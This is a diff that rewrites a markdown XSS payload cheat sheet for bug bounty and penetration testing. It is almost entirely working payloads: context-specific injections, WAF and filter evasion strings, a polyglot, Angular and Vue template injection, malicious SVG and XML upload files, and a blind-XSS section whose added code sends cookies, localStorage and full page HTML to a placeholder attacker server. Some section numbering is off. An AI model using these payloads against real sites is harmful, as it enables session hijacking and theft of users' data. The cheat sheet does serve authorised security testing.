@@ -1,180 +1,170 @@
-## All XSS Payloads Should Be Tested Ethically and Only in Authorized Environments
+# 🛡️ Advanced XSS Payload & Bypass Cheatsheet
 
-* Bypasses often rely on **browser quirks**, **contextual placement**, or **filter evasion**.
-* XSS without context is useless—understand the sink, encoding, sanitization, and injection point.
+> **⚠️ Ethical Warning:** This list is for educational and authorized testing purposes only (e.g., Bug Bounties, Penetration Testing). Unauthorized use is illegal.
 
----
+## 🎯 1. The "Context is King" Section
 
-# 🧨 XSS Payload Cheat Sheet
+*XSS is useless if you don't know where you are landing. Choose the payload based on the injection point.*
 
-> *A curated collection of XSS payloads for bug bounty and research use. Organized by context and filter bypass techniques.*
-> *All payloads are **for authorized testing only**. Responsible disclosure encouraged.*
+### A. HTML Body Context (Standard)
 
----
-
-## 🔹 1. Basic Payloads
+*When input lands directly between tags like `<div>[INPUT]</div>`.*
 
 ```html
 <script>alert(1)</script>
-<svg onload=alert(1)>
-<iframe src="javascript:alert(1)"></iframe>
-<math><mi//xlink:href="javascript:alert(1)">CLICK</math>
-<IMG SRC="javascript:alert(1)">
-<IMG SRC=# onerror="alert(1)">
+<svg/onload=alert(1)>
+<body/onload=alert(1)>
+<iframe/onload=alert(1)></iframe>
+<ScRiPt>alert(1)</sCrIpT>
+<scr%00ipt>alert(1)</script>
+
 ```
 
----
+### B. Attribute Context
 
-## 🔹 2. Attribute Injection (e.g., inside `href`, `src`, etc.)
+*When input lands inside a tag attribute: `<input value="[INPUT]">`.*
 
 ```html
 "><script>alert(1)</script>
 "><img src=x onerror=alert(1)>
-"onmouseover="alert(1)
+
+" onfocus=alert(1) autofocus "
+" onmouseover=alert(1) "
+
 javascript:alert(1)
-data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+java%09script:alert(1) javascript://%250Aalert(1) ```
+```
+
+## C. JavaScript Context
+*When input lands inside a `<script>` block: `<script>var x = '[INPUT]';</script>`.*
+
+```javascript
+// 1. Break the string and the script tag (The Nuclear Option)
+</script><script>alert(1)</script>
+
+// 2. Break the string to execute code
+'-alert(1)-'
+";alert(1);"
+\u0027;alert(1);// (Unicode escape for single quote)
+
+// 3. Template Literal Injection (Backticks)
+${alert(1)}
 ```
 
 ---
 
-## 🔹 3. Event Handler Injection
+## 🚧 2. Filter & WAF Evasion
+
+*When standard payloads are blocked by a firewall or sanitizer.*
+
+### A. Whitespace & Separator Bypasses
+
+*Browsers allow weird separators that WAFs often miss.*
 
 ```html
-<video autoplay onloadstart=alert(1)>
-<svg onmouseover=alert(1)>
-<body onresize=alert(1)>
-<details ontoggle=alert(1)>
-<marquee onstart=alert(1)>
+<svg/onload=alert(1)>
+<svg///onload=alert(1)>
+<img src=x onerror=alert(1)//>
+<svg/onload=alert(1)</noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+
+```
+
+**The "0xSobky" Polyglot:**
+
+```text
+javascript://%250Aalert(1)//"/*\'/*"/*--></title></style></textarea></script><svg/onload=alert(1)>
+
 ```
 
 ---
 
-## 🔹 4. DOM XSS (Client-side sink exploitation)
+## ⚛️ 4. Modern Framework Injection (CSTI)
 
-```js
-// Sinks
-document.write("<img src=x onerror=alert(1)>")
-location.hash = "<svg onload=alert(1)>"
-document.body.innerHTML = location.hash
-```
+*For React, Vue, Angular, etc. These target the Template Engine, not just the HTML.*
 
----
+### Angular (Modern & Legacy)
 
-## 🔹 5. HTML Injection in `input` or `textarea`
-
-```html
-<textarea autofocus onfocus=alert(1)>X
-<input autofocus onfocus=alert(1) type=text>
-<keygen autofocus onfocus=alert(1)>
-```
-
----
-
-## 🔹 6. JS Context Injection
-
-```js
-');alert(1);//
-";alert(1);// 
-';alert(String.fromCharCode(88,83,83));// 
-" style="animation-name:x" onanimationstart=alert(1)
-```
-
----
-
-## 🔹 7. SVG & XML-based Payloads
-
-```html
-<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
-<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"></body></foreignObject></svg>
-```
-
----
-
-## 🔹 8. Polyglot Payloads
-
-```html
-"><svg/onload=alert(1)>"
-</script><svg/onload=alert(1)>//
-"><script src=//xss.rocks/xss.js></script>
-<iframe/src="data:text/html,<script>alert(1)</script>">
-```
-
----
-
-## 🔹 9. CSP Bypass Examples
-
-```html
-<script src='data:text/javascript,alert(1)'></script>
-<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
-<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>
-```
-
----
-
-## 🔹 10. Advanced JS URI + UTF-7/8/Obfuscation
-
-```html
-<a href="javas&#99;ript:alert(1)">X</a>
-<svg><script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')</script></svg>
-<script>eval(atob("YWxlcnQoMSk="))</script>
-```
-
----
-
-## 🔹 11. Inline JavaScript with `setTimeout`, `Function`, etc.
-
-```html
-<img src=x onerror="setTimeout`alert\x281\x29`">
-<img src=x onerror="(new Function`alert(1)`)()">
-<svg><script>top </script></svg>
-```
-
----
-
-## 🔹 12. Framework-Specific Tricks
-
-### React / Angular / Vue:
-
-```jsx
-// React JSX
-dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}
-
-// AngularJS Template Injection
+```javascript
+// Angular 1.x (Legacy)
 {{constructor.constructor('alert(1)')()}}
 
-// Vue XSS via {{ }}
-<div>{{alert(1)}}</div>
+// Angular (Modern - generally requires a sanitization bypass or specific setup)
+{{$on.constructor('alert(1)')()}}
+
+```
+
+### Vue.js
+
+```javascript
+// Vue 2.x
+{{constructor.constructor('alert(1)')()}}
+
+// Vue 3 (Mounting point injection)
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+
+```
+
+### React
+
+*React is secure by default. You are looking for `dangerouslySetInnerHTML` or vulnerable props.*
+
+```javascript
+// If you control props:
+<a href={user_input}>Link</a> // user_input = "javascript:alert(1)"
+
 ```
 
 ---
 
-## 🔹 13. Input Encoding and Filter Bypass
+## 📄 5. File Upload Vectors
 
-```html
-<svg o%6e%6c%6f%61%64=alert(1)>
-<IMG SRC=JaVaScRiPt:alert(1)>
-<svg><script>eval/*x*/(String.fromCharCode(97,108,101,114,116,40,49,41))</script></svg>
+*If you can upload a file, you can often trigger XSS.*
+
+**SVG XSS (Save as `logo.svg`)**
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert(1);
+   </script>
+</svg>
+
+```
+
+**XML/XSLT (Save as `data.xml`)**
+*Often overlooked in PDF generators or data parsers.*
+
+```xml
+<a xmlns:a="http://www.w3.org/1999/xhtml"><a:body onload="alert(1)"/></a>
+
 ```
 
 ---
 
-## 🔹 14. File Upload (if HTML/JS is accepted)
+## 🕵️ 6. Blind XSS & Data Exfiltration
 
-```html
-// test.svg
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+*For when you don't see the alert box (e.g., admin panels, log viewers).*
+*Use Burp Collaborator, Interactsh, or a custom server.*
 
-// test.html
-<html><body><script>alert(1)</script></body></html>
+```javascript
+// 1. Basic Ping
+<script src=http://YOUR_COLLABORATOR_ID></script>
+
+// 2. Steal Cookies (The "Classic")
+<script>fetch('https://YOUR_SERVER/?cookie=' + btoa(document.cookie))</script>
+
+// 3. Steal LocalStorage (Modern Apps use this more than cookies)
+<img src=x onerror='fetch("https://YOUR_SERVER/?ls="+btoa(JSON.stringify(localStorage)))'>
+
+// 4. Exfiltrate full page HTML (See what the admin sees)
+<script>
+fetch('https://YOUR_SERVER/', {
+  method: 'POST',
+  body: document.documentElement.outerHTML
+});
+</script>
+
 ```
-
----
-
-## 🔹 15. Blind XSS for Collaboration Tools or Admin Panels
-
-```html
-<script src=//yourdomain.burpcollaborator.net></script>
-<img src=//yourdomain.oast.live onerror=alert(1)>
-```
-
----
